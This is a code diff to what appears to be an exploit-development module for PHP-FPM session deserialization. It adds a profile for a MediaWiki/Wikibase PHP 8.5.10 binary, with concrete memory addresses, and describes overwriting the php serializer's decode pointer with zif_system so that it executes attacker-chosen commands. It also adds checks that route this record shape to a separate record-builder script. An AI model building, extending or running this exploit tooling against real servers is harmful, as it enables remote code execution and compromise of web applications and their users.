@@ -16,6 +16,15 @@ F+0x10=strlen(F+0x18), and a non-empty NUL-free command at F+0x18. zif_system
 executes the command and is one-shot (its return_value write SIGSEGVs at
 php_exec+450); zif_passthru is the clean surviving control.
 
+The realapps 8.5.10 profile records the confirmed F12b route on the installed
+MediaWiki/Wikibase binary: the active `php` serializer decode slot
+(`ps_serializers[1].decode`, 0x22c54c8) is overwritten with `zif_system`
+(0xa3c061), and the session record is a `php`-format fake execute_data. That
+record shape differs from the php_binary G6 builder, so the profile carries
+`record_builder: php_session_zif` and is rejected by the offline builder with a
+pointer to the receipt's `scripts/mkrec.py`; `zif_passthru` 0xa3c074 is symbol
+verified but its clean real-target run is pending.
+
 This module is profile data plus arithmetic: it loads
 addresses/g2_fpm_<build>.json selected by version, binary md5 or path, computes
 
@@ -44,12 +53,14 @@ PROFILE_FILES = {
     "8.4.25": "g2_fpm_8425.json",
     "8.1.34": "g2_fpm_8134.json",
     "7.4.33": "g2_fpm_7433.json",
+    "realapps-8.5.10": "g2_fpm_realapps_8510.json",
 }
 PROFILE_MD5 = {
     "825470df6b9fa7d0178a1a9bcf4ce6dc": "8.5.10",
     "95cca39b95cb5f2d5b897fc5cc6e8628": "8.4.25",
     "6ea2762ef76f44674805736e19570bb1": "8.1.34",
     "9c7b5c2287fdebe6b3324223034715da": "7.4.33",
+    "4ee099823b75e16ea36f93c71d57bfd8": "realapps-8.5.10",
 }
 COMMAND_BYTES = 32
 FAKE_P_BYTES = 72
@@ -68,6 +79,20 @@ ZIF_ARG1_VALUE_OFF = 0x50
 ZIF_ARG1_TYPE_OFF = 0x58
 ZIF_ARG1_IS_STRING = 6
 ZIF_RECEIPT = "/tmp/opencode/research/g6zif_20261021T222434Z"
+PHP_BINARY_ZIF_BUILDER = "php_binary_zif"
+F12B_RECEIPT = "/tmp/opencode/research/f12b_zif_20261021T222457Z"
+
+
+def _require_record_builder(profile: dict) -> None:
+    """Reject profiles whose record shape this offline builder does not emit."""
+    builder = profile.get("record_builder", PHP_BINARY_ZIF_BUILDER)
+    if builder != PHP_BINARY_ZIF_BUILDER:
+        raise ValueError(
+            f"profile {profile.get('name')!r} uses the {builder!r} session "
+            "record shape; the offline --step g2 builder emits only the "
+            f"{PHP_BINARY_ZIF_BUILDER!r} php_binary record. Use the F12b "
+            f"receipt's scripts/mkrec.py ({F12B_RECEIPT}) for that route."
+        )
 
 
 def hex_int(value, name: str) -> int:
@@ -283,6 +308,7 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
         profile, resolved_path = load_profile()
         if profile_path is None:
             profile_path = resolved_path
+    _require_record_builder(profile)
     table = profile["ps_serializers"]
     if target is None:
         target = hex_int(table["default_target"], "default target")
@@ -475,6 +501,7 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
         profile, resolved_path = load_profile()
         if profile_path is None:
             profile_path = resolved_path
+    _require_record_builder(profile)
     table = profile["ps_serializers"]
     zif = _zif_symbol(profile, decode)
     if target is None:
@@ -786,7 +813,10 @@ def main() -> int:
     parser.add_argument("--g2-p", required=True, help="stale php_unserialize_data P")
     parser.add_argument("--g2-b0", required=True, help="stale var_dtor_entries B0")
     parser.add_argument("--g2-profile", default=None,
-                        help="profile version, md5 or .json path (default 8.5.10)")
+                        help="profile version (8.5.10, 8.4.25, 8.1.34, "
+                             "7.4.33, realapps-8.5.10), md5 or .json path "
+                             "(default 8.5.10); realapps-8.5.10 carries the "
+                             "F12b php-session record and is rejected")
     parser.add_argument("--g2-decode", choices=DECODE_MODES, default="php_binary",
                         help="php_binary (G2), zif_passthru (G6 clean) or "
                              "zif_system (G6 one-shot)")
